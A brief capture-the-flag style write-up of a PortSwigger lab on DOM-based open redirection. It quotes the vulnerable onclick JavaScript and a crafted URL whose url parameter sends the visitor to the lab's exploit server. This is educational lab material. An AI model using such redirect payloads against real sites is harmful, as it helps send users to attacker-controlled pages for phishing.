An open-redirect is a web security vulnerability occurring when an application allows user-controllable input to determine the destination of a redirect without proper validation.

[LAB: DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
Upon viewing the HTML source page, an `onclick` tag with a `url=` parameter executes anything that it passes into.
```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
By simply appending the `url` parameter after the `postId` we can then paste the **exploit server URL** to solve the lab
![](../../Writeups/assets/Pasted%20image%2020260204172839.png)
```
https://XXXXX.web-security-academy.net/post?postId=5&url=https://exploit-0ac70007039b355d83715e4501a5001e.exploit-server.net/
```
